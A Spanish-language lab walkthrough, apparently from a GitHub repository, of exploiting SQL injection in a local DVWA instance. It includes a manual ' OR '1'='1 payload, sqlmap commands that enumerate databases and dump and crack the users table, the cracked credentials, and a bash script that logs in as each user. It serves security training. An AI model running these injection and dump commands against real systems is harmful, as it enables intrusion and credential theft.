# üîç Explotaci√≥n: SQL Injection (Low)

## 1Ô∏è‚É£ Identificaci√≥n manual

1) URL vulnerable:

```Http
http://127.0.0.1:8080/vulnerabilities/sqli/
```

<img width="691" height="412" alt="imagen" src="https://github.com/user-attachments/assets/ba9986a7-8381-4829-a2f8-c6d8bb7a2c69" />

2) Ponemos ID = 1 y pulsamos **Submit**.


3) Payload b√°sico: Payload que introduciremos al final de la URL anterior.

```Http
?id=1' OR '1'='1&Submit=Submit#
```

Resultado URL completa:

```Http
http://127.0.0.1:8080/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit#
```

Tras entrar, podremos ver el ***listado de todos los usuarios****.

<img width="669" height="430" alt="imagen" src="https://github.com/user-attachments/assets/184b860e-b07c-474f-8344-284703767d17" />


## 2Ô∏è‚É£ Enumerar bases de datos con sqlmap

**Objetivo:** 

Este comando utiliza ***sqlmap***, una herramienta autom√°tica de inyecci√≥n SQL, para detectar y enumerar las bases de datos disponibles en una aplicaci√≥n vulnerable. En este caso, se apunta a DVWA (Damn Vulnerable Web Application) corriendo en local.

### üß© Explicaci√≥n del comando

```bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1" \
       --cookie="PHPSESSID=abc123xyz456; security=low" \
       --dbs
```

- **sqlmap:** Ejecuta la herramienta sqlmap.
- **-u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1"**: URL del par√°metro vulnerable (id=1) que vamos a probar.
- **--cookie="PHPSESSID=abc123xyz456; security=low"**: Cookies necesarias para mantener sesi√≥n activa y el nivel de seguridad bajo.
- **--dbs**: Indica a sqlmap que enumere las bases de datos disponibles en el servidor.

### ‚úÖ Requisitos previos

- DVWA debe estar corriendo en el puerto 8080.
- Debes haber iniciado sesi√≥n en DVWA desde el navegador para obtener una cookie v√°lida (PHPSESSID).
- El nivel de seguridad debe estar configurado en low para facilitar la explotaci√≥n.

### üìå Resultado esperado

Si el objetivo es vulnerable, sqlmap mostrar√° algo como:

```Code
available databases [2]:
[*] dvwa
[*] information_schema
```

### üìå Resultado real consola

<img width="884" height="235" alt="imagen" src="https://github.com/user-attachments/assets/ceaf0540-eb72-4fea-9e9a-b70272226e6e" />

Esto indica que ha detectado las bases de datos disponibles en el sistema, incluyendo la base de datos principal de DVWA.


## 3Ô∏è‚É£ Ver tablas en la base dvwa

**Objetivo:** 

Este comando enumera todas las tablas existentes dentro de la base de datos dvwa, previamente identificada con sqlmap. Es √∫til para saber qu√© estructuras de datos contiene la aplicaci√≥n vulnerable.

### üß© Explicaci√≥n del comando

```bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1" \
       --cookie="PHPSESSID=abc123xyz456; security=low" \
       -D dvwa --tables
```

- **-D dvwa**: Especifica la base de datos objetivo (dvwa).
- **--tables**: Solicita a sqlmap que enumere todas las tablas dentro de esa base.

### ‚úÖ Requisitos previos

- Haber identificado previamente la base de datos dvwa con el par√°metro --dbs.
- Mantener la sesi√≥n activa con la cookie v√°lida.

### üìå Resultado esperado

Si la base contiene tablas, sqlmap mostrar√° algo como:

```Code
Database: dvwa
[1 table]
+--------+
| users  |
+--------+
```

### üìå Resultado real consola:

<img width="874" height="286" alt="imagen" src="https://github.com/user-attachments/assets/735b9a5f-1f05-468d-8264-3426af57d42e" />

Esto indica que la base dvwa contiene una tabla llamada users, que probablemente almacene credenciales o informaci√≥n sensible.

## 4Ô∏è‚É£ Extraer datos de la tabla users

**Objetivo:**

Este comando extrae el contenido completo de la tabla users dentro de la base dvwa. Es una fase cr√≠tica en la explotaci√≥n, ya que permite visualizar datos como nombres de usuario y contrase√±as.

Cuando se ejecute, deberemos aprobar o denegar algunas √≥rdenes de la ejecuci√≥n que son:

1. Reconocer las columnas de la tabla users.
2. Encuentra hashes MD5 en la columna password.
3. Pregunta si quieres guardarlos en un archivo temporal.
4. Te pregunta si quieres crackearlos usando ataque por diccionario.
5. Ahora usa el diccionario por defecto (wordlist.txt), con sufijos comunes activados (opci√≥n slow).

Cuando termine:

```pgsql
[INFO] cracked password: 'password123'
```

### üß© Explicaci√≥n del comando

```bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1" \
       --cookie="PHPSESSID=abc123xyz456; security=low" \
       -D dvwa -T users --dump
```

- **-D dvwa**: Selecciona la base de datos dvwa.
- **-T users**: Especifica la tabla users como objetivo.
- **--dump**: Extra y muestra todos los datos almacenados en esa tabla.

### ‚úÖ Requisitos previos

- Haber identificado la tabla users con el par√°metro --tables.
- Tener una sesi√≥n activa con la cookie correspondiente.

### üìå Resultado esperado

El resultado puede incluir algo como:

```Code
Database: dvwa
Table: users
[5 entries]
+----+----------+----------+------------------+
| id | username | password | hash             |
+----+----------+----------+------------------+
| 1  | admin    | password | 5f4dcc3b5aa765d...|
...
```

### üìå Resultado real consola:

<img width="1284" height="286" alt="imagen" src="https://github.com/user-attachments/assets/6c9ae0b0-86a4-49c5-8ee7-378db00eb221" />

Esto revela las credenciales almacenadas en la aplicaci√≥n, que pueden ser utilizadas para acceder como administrador o realizar otras pruebas de seguridad.

**Observaciones:**

- Contrase√±as d√©biles y repetidas (password repetida en admin y smithy).
- Todas las contrase√±as fueron crackeadas con diccionario por defecto + sufijos comunes.
- El sistema no parece tener bloqueo por intentos fallidos (failed_login = 0 en todos).


## 4Ô∏è‚É£ Tras exiltrar y crackear las credenciales

Las debemos usar para obtener acceso leg√≠timo a la aplicaci√≠on DVWA con distintos usuarios para:

1. Ver las diferencias de permisos (si las hubiera) entre usuarios.
2. Buscar funcionalidades internas que no est√©n visibles sin autenticaci√≥n.
3. Plantear ataques post-instrusi√≥n (subida de ficheros, ejecuci√≥n de comandos, XSS interno, etc).

### üîπ Paso 1 ‚Äî Entrar a DVWA con las credenciales obtenida

Tenemos 5 usuarios v√°lidos:

| Usuario | Contrase√±a |
| ------- | ---------- |
| admin   | password   |
| gordonb | abc123     |
| 1337    | charley    |
| pablo   | letmein    |
| smithy  | password   |

Accedemos manualmente en la p√°gina de login de DVWA:

```arduino
http://127.0.0.1:8080/login.php
```

Probamos a iniciar sesi√≥n con cada usuario y anotamos:

- Si se muestran men√∫s o opciones diferentes.
- Si el nivel de permisos cambia (DVWA no siempre lo implementa, pero es buen h√°bito revisarlo).
- Fecha y hora del √∫ltimo acceso (puede ser √∫til para simular un an√°lisis forense).

1) **Usuario gordonb con contrase√±a abc123:**

- **Nivel de seguridad actual** -> LOW

Podemos verlo en la parte inferior de la pantalla en: Security level: low/medium/high.

- **Opciones del men√∫ lateral** -> Todas

Por ejemplo: SQL Inejction, Command Injection, File Upload...). Si tenemos m√°s o menos opciones seg√∫n el usuario, eso ser√≠a una ***diferencia de permisos***.

- **Contenido personalizado** -> Ninguno.

En DVWA normalmente no hay, pero en webs reales podr√≠a mostrar dashboards diferentes.

2) **Resto de usuarios tienen misma configuraci√≥n**

### üîπ Paso 2 ‚Äî Guardar cookies de cada usuario

Una vez logueado con un usuario:

- Abrimos herramientas de desarrollador ‚Üí Almacenamiento / Cookies.
- Copia el valor de PHPSESSID y security para poder automatizar pruebas con curl o sqlmap.

Esto nos permitir√° m√°s adelante:

- **Explotar vulnerabilidades autenticadas.**
- Realizar **fuerza bruta de paneles internos** si existieran.
- Hacer **RCE (Remote Code Execution)** en m√≥dulos como Command Injection.

            
‚îå‚îÄ‚îÄ(javier„âøkali)-[~/Pentesting/DVWA]
‚îî‚îÄ$ ~/Pentesting/DVWA/compare_dvwa_users.sh
[‚úÖ] Cookie para pablo: PHPSESSID=8gttcqpe1jcmkim7ik1ctvcon5
[‚úÖ] Cookie para smithy: PHPSESSID=q4nj3ki3rk9g35bnlmnnhubfj5
[=] smithy es igual al admin.
[‚úÖ] Cookie para 1337: PHPSESSID=qpqbstq2qdne4f2dmp1s2olgn7
[=] 1337 es igual al admin.
[‚úÖ] Cookie para gordonb: PHPSESSID=b6agp4c402rc5ff431v45mqiu5
[=] gordonb es igual al admin.
[‚úÖ] Cookie para admin: PHPSESSID=l6ai6unl2n0b018e14oau9un82
[=] admin es igual al admin.
üìÇ HTML guardados en: /home/javier/Pentesting/DVWA/sessions

Comprobado que todos los usuarios ven el mismo contenido que el admin, lo que confirma que:

- No hay control de permisos por usuario.
- Cualquier usuario logueado puede acceder a las mismas funciones.
- Esto es un fallo de **Broken Access Control** (control de acceso roto).


                                                                                           
#### SCRIPT compare_dvwa_users.sh

Este script realiza las acciones:

- Prueba autom√°ticamente cada usuario/contrase√±a que hemos obtenido.
- Guarda el HTML que recibe en la carpeta ~/Pentesting/DVWA/sessions/
- Compara cada HTML con el del admin y te dice si hay diferencias.

Gu√°rdalo en ~/Pentesting/DVWA/compare_dvwa_users.sh:

```Bash
#!/bin/bash

# üìÇ Carpeta donde guardaremos los HTML
OUTPUT_DIR="$HOME/Pentesting/DVWA/sessions"
mkdir -p "$OUTPUT_DIR"

# üåê URL base de DVWA
BASE_URL="http://127.0.0.1:8080"

# üîë Lista de usuarios y contrase√±as obtenidos
declare -A USERS
USERS[admin]="password"
USERS[gordonb]="abc123"
USERS[1337]="charley"
USERS[pablo]="letmein"
USERS[smithy]="password"

# üç™ Funci√≥n para obtener cookie PHPSESSID despu√©s de login
get_cookie() {
    USER=$1
    PASS=$2
    COOKIE=$(curl -s -i "$BASE_URL/login.php" \
        -d "username=$USER&password=$PASS&Login=Login" \
        | grep -i "Set-Cookie" | grep -o "PHPSESSID=[^;]*" | head -n 1)
    echo "$COOKIE"
}

# üìÑ Guardar HTML para cada usuario
first=true
for USER in "${!USERS[@]}"; do
    PASS="${USERS[$USER]}"
    COOKIE=$(get_cookie "$USER" "$PASS")

    if [ -z "$COOKIE" ]; then
        echo "[‚ùå] No se pudo obtener cookie para $USER:$PASS"
        continue
    fi

    echo "[‚úÖ] Cookie para $USER: $COOKIE"

    FILE="$OUTPUT_DIR/index_${USER}.html"
    curl -s "$BASE_URL/index.php" -H "Cookie: $COOKIE; security=low" > "$FILE"

    # Guardar el primero como base para comparaci√≥n
    if $first; then
        BASE_FILE="$FILE"
        first=false
    else
        DIFF=$(diff -q "$BASE_FILE" "$FILE")
        if [ -z "$DIFF" ]; then
            echo "[=] $USER es igual al admin."
        else
            echo "[‚ö†] $USER tiene diferencias con admin."
        fi
    fi
done

echo "üìÇ HTML guardados en: $OUTPUT_DIR"
```

##### Instrucciones de uso

```bash
chmod +x ~/Pentesting/DVWA/compare_dvwa_users.sh
~/Pentesting/DVWA/compare_dvwa_users.sh
```

Esto genera:

- Todos los archivos index_usuario.html en ~/Pentesting/DVWA/sessions/
- Una comparaci√≥n autom√°tica con el del admin.
- Un log en pantalla indicando si son iguales o diferentes.



### üîπ Paso 3 ‚Äî Elegir el primer ataque post-login

Empezar√≠amos con:

1. **Command Injection:** para obtener ejecuci√≥n de comandos en el servidor.
2. **File Upload:** para subir una ***webshell*** y ganar acceso total al sistema.





## üì• Guardar resultados en archivos de texto

Tras las primeras pruebas de explotaci√≥n en DVWA empezamos a guardar la informaci√≥n que vamos recopilando de los tres comandos anteriormente ejecutados

### 1Ô∏è‚É£ Bases de datos detectadas

Podemos hacerlo de forma convencional usando el argumento **>** y la ruta a la que deseemos guardarla. 

Ejemplo: > /home/javier/Pentesting/DVWA/loot/databases_submit.txt

```bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" \
       --cookie="PHPSESSID=f733da4srmcuf6rtjb0tfniep1; security=low" \
       --dbs > /home/javier/Pentesting/DVWA/loot/databases_submit.txt
```

üî∏ Guarda la lista de bases de datos en databases_submit.txt.

### 2Ô∏è‚É£ Tablas en la base dvwa

```Bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" \
       --cookie="PHPSESSID=f733da4srmcuf6rtjb0tfniep1; security=low" \
       -D dvwa --tables > /home/javier/Pentesting/DVWA/loot/tables_submit.txt
```

üî∏ Guarda las tablas encontradas en tables_submit.txt.

### 3Ô∏è‚É£ Volcado de la tabla users

```Bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" \
       --cookie="PHPSESSID=f733da4srmcuf6rtjb0tfniep1; security=low" \
       -D dvwa -T users --dump > /home/javier/Pentesting/DVWA/loot/users_dump_submit.txt
```

üî∏ Guarda el contenido completo de la tabla users en users_dump_submit.txt.

### üß† Tip extra: A√±adir fecha al archivo autom√°ticamente

Si quieres que los archivos incluyan la fecha en el nombre, puedes hacer esto:

```Bash
sqlmap ... > /home/javier/Pentesting/DVWA/loot/databases_$(date +%F).txt
```

üîπ Esto generar√° un archivo como databases_2025-08-15.txt.

## üì∏ Guardar capturas de pantalla en Kali Linux

### ‚úÖ Herramientas recomendadas

| Herramienta        | Descripci√≥n                                           | Comando b√°sico                                              |
|--------------------|-------------------------------------------------------|-------------------------------------------------------------|
| `gnome-screenshot` | Herramienta nativa en entornos GNOME                 | `gnome-screenshot -f ~/Pentesting/DVWA/screens/captura.png` |
| `flameshot`        | Muy popular entre pentesters, permite edici√≥n r√°pida | `flameshot gui`                                              |
| `scrot`            | Ligera y r√°pida, ideal para terminal                 | `scrot ~/Pentesting/DVWA/screens/captura.png`               |


### üß∞ Ejemplos de uso

#### üì∑ Captura completa con gnome-screenshot

```bash
gnome-screenshot -f ~/Pentesting/DVWA/screens/dvwa_login.png
```

üî∏ Guarda una captura de toda la pantalla con nombre dvwa_login.png.

#### ‚úÇÔ∏è Captura interactiva con flameshot

```Bash
flameshot gui
```

üî∏ Se abre una interfaz para seleccionar √°rea, dibujar, y guardar. 
üî∏ Puedes configurar el directorio de guardado en las opciones o usar:

```Bash
flameshot gui -p ~/Pentesting/DVWA/screens/
```

#### üì∏ Captura r√°pida con scrot

```Bash
scrot ~/Pentesting/DVWA/screens/dvwa_users.png
```

üî∏ Captura inmediata de toda la pantalla y guarda en el directorio screens.

## üç™ ¬øC√≥mo obtener la cookie PHPSESSID?

### üîπ Opci√≥n 1: Desde navegador

1. F12 ‚Üí pesta√±a **Storage/Application**.
2. Buscar cookies de http://127.0.0.1:8080.
3. Copiar valor de PHPSESSID.

### üîπ Opci√≥n 2: Desde terminal

```bash
curl -i http://127.0.0.1:8080/login.php
```

Buscar l√≠nea:

```Http
Set-Cookie: PHPSESSID=abcdef1234567890; path=/
```

## üì∏ Documentaci√≥n de evidencias

- Guardar respuestas HTTP:

```bash
curl -s -D ~/Pentesting/DVWA/requests/sqli_login.headers \
     -o ~/Pentesting/DVWA/requests/sqli_login.html \
     "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit#"
```
